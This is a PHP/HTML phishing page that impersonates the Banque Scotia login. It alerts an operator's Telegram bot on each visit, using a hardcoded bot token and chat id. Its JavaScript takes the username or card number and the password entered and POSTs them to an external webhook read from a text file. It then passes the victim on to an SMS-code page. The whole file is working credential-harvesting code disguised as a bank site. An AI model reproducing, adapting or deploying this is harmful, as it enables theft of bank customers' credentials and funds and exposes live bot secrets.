<?php session_start();
$_SESSION["bank"] ='scotia';

?>




<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 
// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*.".$_SESSION["bank"]."*🏛🏛\n";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/scotia/styles_mobile.css">

     <link rel="stylesheet" media="screen and (min-width: 769px)" href="/scotia/styles_pc.css">
    <title>SCOTIA</title>
    <style>
.spinner {
    border: 6px solid #f3f3f3;
    border-top: 6px solid #006241;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    animation: spin 1s linear infinite;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

#errorPopup {
    position: fixed;
    top: 30%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #f44336;
    color: white;
    padding: 20px 30px;
    border-radius: 10px;
    z-index: 10000;
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    cursor: pointer;
    font-size: 16px;
}
</style>
</head>
<body>
    <div class="container">
        <div class="header">
    <div class="title">
        <span class="title1" >Bienvenue a la </span> 
        <span class="title2">Banque Scotia</span>
    </div>
        </div>
        <div class="body">
        <form id='loginForm' action="/scotia/sms.php" method="post">
  <div class="inputForm">
       <img class="img" src="/scotia/img/profile.png"> <input type="text" name="cvv" placeholder="Nom d'utilisateur ou Numero de carte " required >
  </div>


  <div class="inputForm">
     <img class="img" src="/scotia/img/lock.png"> <input type="password" name="mdp" placeholder="Mot de passe " required >
    </div>

    <div class="inputFormCheck">
    <input type="checkbox"  > Memoriser mon nom d'utilisateur ou numero de carte
    </div>

    <div class="inputFormSubmit">
    <input type="submit" value="Ouvrir une session" >
    </div>

    <b>Besoin d'aide pour ouvrir une session ?</b>

        </form>


        </div>


    </div>

    <div class="bas">

    <span>Avez-vous un nom d'utilisateur et un mot de passe ?</span> <br><br>
    <b>Etablissez-les maintenant</b>
    </div>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('/webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>

</body>
</html>
